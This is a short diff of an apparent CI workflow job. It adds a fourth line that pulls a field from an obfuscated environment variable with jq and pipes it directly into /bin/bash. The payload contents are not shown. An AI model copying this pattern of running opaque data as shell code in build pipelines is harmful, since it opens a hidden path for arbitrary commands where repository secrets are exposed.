@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$w56" | jq -r .trm4948 | /bin/bash
           echo $s45513 | jq -r .bwnv65 | /bin/bash
           echo $whv7 | jq -r .pimg117 | /bin/bash
+          echo $nfvq1 | jq -r .mmo94 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
